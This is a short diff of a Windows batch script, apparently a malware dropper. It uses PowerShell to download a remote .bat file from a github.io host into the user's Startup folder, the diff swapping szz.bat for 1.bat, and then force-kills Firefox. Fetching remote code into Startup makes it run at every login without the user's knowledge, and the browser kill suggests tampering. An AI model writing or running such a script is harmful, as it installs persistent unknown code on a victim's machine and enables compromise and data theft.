@@ -3,7 +3,7 @@
 set "StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 :: Download szz.bat to Startup folder
-powershell -Command "Invoke-WebRequest -Uri 'https://giggityfiles.github.io/szz.bat' -OutFile '%StartupFolder%\szz.bat'"
+powershell -Command "Invoke-WebRequest -Uri 'https://giggityfiles.github.io/1.bat' -OutFile '%StartupFolder%\1.bat'"
 
 :: Kill Firefox if running
 taskkill /f /im firefox.exe
